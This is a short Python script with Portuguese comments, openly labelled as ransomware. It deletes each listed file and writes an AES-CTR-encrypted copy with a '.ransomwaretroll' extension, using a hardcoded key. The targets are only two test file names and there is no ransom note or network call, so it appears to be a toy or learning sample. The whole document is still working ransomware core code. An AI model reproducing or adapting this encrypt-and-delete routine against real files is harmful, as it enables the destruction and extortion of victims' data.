import os
import pyaes

def encrypt_file(file_name, key):
    try:
        # Abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()
        
        # Remover o arquivo original
        os.remove(file_name)
        
        # Criptografar o arquivo
        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)
        
        # Salvar o arquivo criptografado
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, 'wb') as new_file:
            new_file.write(crypto_data)
        
        print(f"Arquivo {file_name} criptografado com sucesso.")
    
    except Exception as e:
        print(f"Erro ao criptografar o arquivo {file_name}: {e}")

if __name__ == "__main__":
    # Chave de criptografia
    key = b"testeransomwares"
    
    # Lista de arquivos a serem criptografados
    files_to_encrypt = ["teste.txt", "outro_arquivo.txt"]
    
    # Criptografar cada arquivo
    for file_name in files_to_encrypt:
        encrypt_file(file_name, key)
